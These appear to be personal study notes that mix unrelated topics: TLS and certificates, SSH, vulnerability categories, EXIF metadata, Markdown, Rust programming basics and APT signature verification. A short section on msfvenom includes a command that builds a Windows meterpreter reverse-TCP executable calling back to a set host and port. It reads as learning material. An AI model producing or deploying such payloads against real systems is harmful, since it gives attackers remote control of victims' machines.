    The client responds with a ClientKeyExchange, which contains additional information required to generate the master key. Furthermore, it switches to use encryption and informs the server using the ChangeCipherSpec message.
    The server switches to use encryption as well and informs the client in the ChangeCipherSpec message.

If this still sounds sophisticated, don’t worry; we only need the gist of it. A client was able to agree on a secret key with a server that has a public certificate. This secret key was securely generated so that a third party monitoring the channel wouldn’t be able to discover it. Further communication between the client and the server will be encrypted using the generated key.

Consequently, once an SSL/TLS handshake has been established, HTTP requests and exchanged data won’t be accessible to anyone watching the communication channel.

As a final note, for SSL/TLS to be effective, especially when browsing the web over HTTPS, we rely on public certificates signed by certificate authorities trusted by our systems. In other words, when we browse to TryHackMe over HTTPS, our browser expects the TryHackMe web server to provide a signed certificate from a trusted certificate authority, as per the example below. This way, our browser ensures that it is communicating with the correct server, and a MITM attack cannot occur.

we can see the following information:

    To whom is the certificate issued? That is the name of the company that will use this certificate.
    Who issued the certificate? This is the certificate authority that issued this certificate.
    Validity period. You don’t want to use a certificate that has expired, for instance.

Luckily, we don’t have to check the certificate manually for every site we visit; our web browser will do it for us. Our web browser will ensure that we are talking with the correct server and ensure that our communication is secure, thanks to the server’s certificate.

SSH
To use SSH, you need an SSH server and an SSH client. The SSH server listens on port 22 by default. The SSH client can authenticate using:

    A username and a password
    A private and public key (after the SSH server is configured to recognize the corresponding public key)

Vulnerability	Description
Operating System
	These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based
	These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials
	Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
Application Logic
	These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor
	Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into believing they are legitimate.

    Generating payloads with Msfvenom
      Msfvenom is a combination of two utilities, namely; msfpayload and msfencode
      msfvenom --list payloads
      msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > payloadx86.exe

Photo EXIF Data

EXIF stands for Exchangeable Image File Format; it is a standard for saving metadata to image files. Whenever you take a photo with your smartphone or with your digital camera, plenty of information gets embedded in the image. The following are examples of metadata that can be found in the original digital images:

    Camera model / Smartphone model
    Date and time of image capture
    Photo settings such as focal length, aperture, shutter speed, and ISO settings

Because smartphones are equipped with a GPS sensor, finding GPS coordinates embedded in the image is highly probable. The GPS coordinates, i.e., latitude and longitude, would generally show the place where the photo was taken.

Markdown
[+]Images ==> The first image style is called an inline image link. To create an inline image link, enter an exclamation point ( ! ), wrap the alt text in brackets ( [ ] ), and then wrap the link in parenthesis ( ( ) ). (Alt text is a phrase or sentence that describes the image for the visually impaired.)

For example, to create an inline image link to https://octodex.github.com/images/bannekat.png, with an alt text that says, Benjamin Bannekat, you'd write this in Markdown: ![Benjamin Bannekat](https://octodex.github.com/images/bannekat.png)

For a reference image, you'll follow the same pattern as a reference link. You'll precede the Markdown with an exclamation point, then provide two brackets for the alt text, and then two more for the image tag, like this: ![The founding father][Father] At the bottom of your Markdown page, you'll define an image for the tag, like this: [Father]: http://octodex.github.com/images/founding-father.jpg.

[+] Blockquotes
To create a block quote, all you have to do is preface a line with the "greater than" caret (>).
Notice that even blank lines must contain the caret character. This ensures that the entire blockquote is grouped together.

[+] Lists ==> To create an unordered list, you'll want to preface each item in the list with an asterisk ( * ) ==> An ordered list is prefaced with numbers, instead of asterisks

* First steps ==> Hello world
    > Git files won’t be generated if you run cargo new within an existing Git repository; you can override this behavior by using cargo new --vcs=git.
    > In Rust, packages of code are referred to as crates
    > cargo build => This command creates an executable file in target/debug/hello_cargo (or target\debug\hello_cargo.exe on Windows) rather than in your current directory. Because the default build is a debug build, Cargo puts the binary in a directory named debug. Running cargo build for the first time also causes Cargo to create a new file at the top level: Cargo.lock. This file keeps track of the exact versions of dependencies in your project. This project doesn’t have dependencies, so the file is a bit sparse. You won’t ever need to change this file manually; Cargo manages its contents for you.
    > cargo run => To compile the code and then run the resultant executable all in one command. Using cargo run is more convenient than having to remember to run cargo build and then use the whole path to the binary, so most developers use cargo run.
    > cargo check => This command quickly checks your code to make sure it compiles but doesn’t produce an executable. Why would you not want an executable? Often, cargo check is much faster than cargo build because it skips the step of producing an executable. If you’re continually checking your work while writing the code, using cargo check will speed up the process of letting you know if your project is still compiling! As such, many Rustaceans run cargo check periodically as they write their program to make sure it compiles. Then they run cargo build when they’re ready to use the executable
    > An additional advantage of using Cargo is that the commands are the same no matter which operating system you’re working on. 
    > When your project is finally ready for release, you can use cargo build --release to compile it with optimizations. This command will create an executable in target/release instead of target/debug. The optimizations make your Rust code run faster, but turning them on lengthens the time it takes for your program to compile. This is why there are two different profiles: one for development, when you want to rebuild quickly and often, and another for building the final program you’ll give to a user that won’t be rebuilt repeatedly and that will run as fast as possible. If you’re benchmarking your code’s running time, be sure to run cargo build --release and benchmark with the executable in target/release.

* Cargo as convention
    > Even though the hello_cargo project is simple, it now uses much of the real tooling you’ll use in the rest of your Rust career. In fact, to work on any existing projects, you can use the following commands to check out the code using Git, change to that project’s directory, and build:
    $ git clone example.org/someproject
    $ cd someproject
    $ cargo build

* Programming a guessing name
    > In Rust, variables are immutable by default, meaning once we give the variable a value, the value won’t change. To make a variable mutable, we add mut before the variable name
        let apples = 5;         // immutable
        let mut bananas = 5;    // mutable
    > The :: syntax in the ::new line indicates that new is an associated function of the String type. An associated function is a function that’s implemented on a type, in this case String. This new function creates a new, empty string. You’ll find a new function on many types because it’s a common name for a function that makes a new value of some kind.
        let mut guess = String::new();
    > The & indicates that this argument is a reference, which gives you a way to let multiple parts of your code access one piece of data without needing to copy that data into memory multiple times. References are inmutable by default.
        io::stdin()
            .read_line(&mut guess)
    > As mentioned earlier, read_line puts whatever the user enters into the string we pass to it, but it also returns a Result value. Result is an enumeration, often called an enum, which is a type that can be in one of multiple possible states. We call each possible state a variant.
        + Result’s variants are Ok and Err. The Ok variant indicates the operation was successful, and inside Ok is the successfully generated value. The Err variant means the operation failed, and Err contains information about how or why the operation failed.
        + Values of the Result type, like values of any type, have methods defined on them. An instance of Result has an expect method that you can call. If this instance of Result is an Err value, expect will cause the program to crash and display the message that you passed as an argument to expect. If the read_line method returns an Err, it would likely be the result of an error coming from the underlying operating system. If this instance of Result is an Ok value, expect will take the return value that Ok is holding and return just that value to you so you can use it. In this case, that value is the number of bytes in the user’s input.
        + If you don’t call expect, the program will compile, but you’ll get a warning

    > Cargo understands Semantic Versioning (sometimes called SemVer => http://semver.org/), which is a standard for writing version numbers. The specifier 0.8.5 is actually shorthand for ^0.8.5, which means any version that is at least 0.8.5 but below 0.9.0.

    > Next, we’re adding two lines in the middle. In the first line, we call the rand::thread_rng function that gives us the particular random number generator we’re going to use: one that is local to the current thread of execution and is seeded by the operating system. Then we call the gen_range method on the random number generator. This method is defined by the Rng trait that we brought into scope with the use rand::Rng; statement. The gen_range method takes a range expression as an argument and generates a random number in the range. The kind of range expression we’re using here takes the form start..=end and is inclusive on the lower and upper bounds, so we need to specify 1..=100 to request a number between 1 and 100.
        let secret_number = rand::thread_rng().gen_range(1..=100);

    > Note: You won’t just know which traits to use and which methods and functions to call from a crate, so each crate has documentation with instructions for using it. Another neat feature of Cargo is that running the cargo doc --open command will build documentation provided by all your dependencies locally and open it in your browser. If you’re interested in other functionality in the rand crate, for example, run cargo doc --open and click rand in the sidebar on the left.
    > First we add another use statement, bringing a type called std::cmp::Ordering into scope from the standard library. The Ordering type is another enum and has the variants Less, Greater, and Equal. These are the three outcomes that are possible when you compare two values.
    > The cmp method compares two values and can be called on anything that can be compared. It takes a reference to whatever you want to compare with: here it’s comparing guess to secret_number. Then it returns a variant of the Ordering enum we brought into scope with the use statement. We use a match expression to decide what to do next based on which variant of Ordering was returned from the call to cmp with the values in guess and secret_number.
   > Rust allows us to shadow the previous value of guess with a new one. Shadowing lets us reuse the guess variable name rather than forcing us to create two unique variables, such as guess_str and guess, for example. We’ll cover this in more detail in Chapter 3, but for now, know that this feature is often used when you want to convert a value from one type to another type. 
   > We bind this new variable to the expression guess.trim().parse(). The guess in the expression refers to the original guess variable that contained the input as a string. The trim method on a String instance will eliminate any whitespace at the beginning and end, which we must do to be able to compare the string to the u32, which can only contain numerical data. The user must press enter to satisfy read_line and input their guess, which adds a newline character to the string. For example, if the user types 5 and presses enter, guess looks like this: 5\n. The \n represents “newline.” (On Windows, pressing enter results in a carriage return and a newline, \r\n.) The trim method eliminates \n or \r\n, resulting in just 5.
   > The colon (:) after guess tells Rust we’ll annotate the variable’s type. Rust has a few built-in number types; the u32 seen here is an unsigned, 32-bit integer. It’s a good default choice for a small positive number. You’ll learn about other number types in Chapter 3. Additionally, the u32 annotation in this example program and the comparison with secret_number means Rust will infer that secret_number should be a u32 as well. So now the comparison will be between two values of the same type!
    let guess: u32 = guess.trim().parse().expect("Please type a number");
    
    > The parse method will only work on characters that can logically be converted into numbers and so can easily cause errors. If, for example, the string contained A👍%, there would be no way to convert that to a number.
    > We switch from an expect call to a match expression to move from crashing on an error to handling the error. Remember that parse returns a Result type and Result is an enum that has the variants Ok and Err. We’re using a match expression here, as we did with the Ordering result of the cmp method.
        let guess: u32 = match guess.trim().parse() {
            Ok(num) => num, 
            Err(_) => continue,
        };
    > The underscore, _, is a catchall value; in this example, we’re saying we want to match all Err values, no matter what information they have inside them. So the program will execute the second arm’s code, continue, which tells the program to go to the next iteration of the loop and ask for another guess. So, effectively, the program ignores all errors that parse might encounter!

8-bit	    i8  	      u8
16-bit	  i16	        u16
32-bit	  i32,f32	    u32

arch	    isize	      usize
4 bytes ==> ' '

Booleans are one byte in size. // let f: bool = false; 
we specify char literals with single quotes, as opposed to string literals, which use double quotes.


To explicitly handle the possibility of overflow, you can use these families of methods provided by the standard library for primitive numeric types:

    Wrap in all modes with the wrapping_* methods, such as wrapping_add
    Return the None value if there is overflow with the checked_* methods
    Return the value and a boolean indicating whether there was overflow with the overflowing_* methods
    Saturate at the value’s minimum or maximum values with saturating_* methods

Tuples
We create a tuple by writing a comma-separated list of values inside parentheses. Each position in the tuple has a type, and the types of the different values in the tuple don’t have to be the same.
fn main() {
  let tup: (i32, f64, u8) = (500, 6.4, 1);
  let (x, y, z) = tup; // Access a individual value in this single compound element
  println!("The value of y is: {}",y);
  //Accesing by the index of the value
  let x: (i32, f64, u8) = (500, 6.4, 1);
  let five_hundred = x.0;
}

Array
Unlike a tuple, every element of an array must have the same type. Unlike arrays in some other languages, arrays in Rust have a fixed length.
fn main() {
  let a: [i32; 5] = [1, 2, 3, 4, 5];
  //Accessing array elements
  let first = a[0]; //1
  //You could write
  let a = [3; 5]; //which is equal to ==> let a = [3, 3, 3, 3, 3];
}

//Example of invalid array element access 

This is an example of Rust’s memory safety principles in action. In many low-level languages, this kind of check is not done, and when you provide an incorrect index, invalid memory can be accessed. Rust protects you against this kind of error by immediately exiting instead of allowing the memory access and continuing.


-=-=
3.3. Functions
Rust doesn’t care where you define your functions, only that they’re defined somewhere in a scope that can be seen by the caller.

Statements vs expressions?
  Statements are instructions that perform some action and do not return a value. 
    Ex: let y = 6; //It is a statement
  Expressions evaluate to a resulting value.
    Do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, and it will then not return a value
    Ex: 5 + 6

3.4. Control flow

fn main() {
    let number = 6;

    if number % 4 == 0 {
        println!("number is divisible by 4");
    } else if number % 3 == 0 {
        println!("number is divisible by 3");
    } else if number % 2 == 0 {
        println!("number is divisible by 2");
    } else {
        println!("number is not divisible by 4, 3, or 2");
    }
}


Using if in a let statement
fn main() {
    let condition = true;
    let number = if condition { 5 } else { 6 };

    println!("The value of number is: {number}");
}

//Rust has three kinds of loops: loop, while and for.
loop
  break
  continue: In a loop tells the program to skip over any remaining code in this iteration of the loop and go to the next iteration.
fn main() {
    let mut counter = 0;

    let result = loop {
        counter += 1;
        if counter == 10 {
            break counter * 2;
        }
    };
    println!("The result is {}",result);
}

Loop Labels to Disambiguate Between Multiple Loops
  Loop labels must begin with a single quote. 

  fn main() {
    let mut count = 0;
    'counting_up: loop {
        println!("count = {}",count);
        let mut remaining = 10;
        

        loop {
            println!("remaining = {}",remaining);
            if remaining == 9 {
                break;
            }
            if count == 2{
                break 'counting_up;
            }
            remaining -= 1;
        }
        count += 1;
    }
    println!("End count = {}", count);
}

Looping through a collection with for
  fn main() {
    for number in (1..4).rev() {
        println!("{number}!");
    }
    println!("LIFTOFF!!!");
}

Using APT with HTTPS
apt-get (and other package manipulation commands, which are a front-end to the same APT libraries) can use HTTP, HTTPS and FTP (and mounted filesystems). If you specify https:// URLs in /etc/apt/sources.list and /etc/apt/sources.list.d/*, then APT will use HTTPS.

APT verifies the signature of packages. So you do not need to have a form of transportation that provides data authentication. If an attacker modifies the files you're downloading, this will be noticed. Using a signature verification is better than using an HTTPS connection, because it'll detect an attack on the server you're downloading from, not just an attack in transit.

More precisely, the (simplified) data flow for a package is the following:

    The package is produced on a build machine.
    The package is signed on the build machine.
    The signed package is copied to a download mirror.
    You download the package.

HTTPS ensures that step 4 happens correctly. The package signatures ensure that steps 2 to 4 happen correctly.

In fact, there is one small benefit to HTTPS for step 4: the package signatures only ensure that the package is authentic. An attacker in step 4 could impersonate a legitimate server and serve stale versions of the package. For example, the attacker could prevent you from downloading any security updates, in the hope of exploiting a vulnerability on your machine that you would have patched if it wasn't for the attack. This isn't a very realistic scenario, because it requires an active attacker (so that would have to be someone in control of your Internet connection), but it could happen in principle.

The other benefit to HTTPS would be if you're trying to hide the fact that you're downloading Ubuntu packages from someone snooping on your network connection. Even then, the eavesdropper could see what host you're connecting to; if you connect to an Ubuntu mirror and download hundreds of megabytes, it's clear that you're downloading Ubuntu packages. The eavesdropper could also mostly figure out which packages you're downloading from the size of the files. So HTTPS would only be useful if you're downloading from a server that also offers other files of similar size — I don't see any point except for third-party packages, and only in very unusual circumstances.

To reiterate: the usual benefit of HTTPS, which is that you know you're connected to the real server, is useless when you're downloading Ubuntu packages. The signature verification on packages gives a stronger guarantee than what HTTPS can provide.
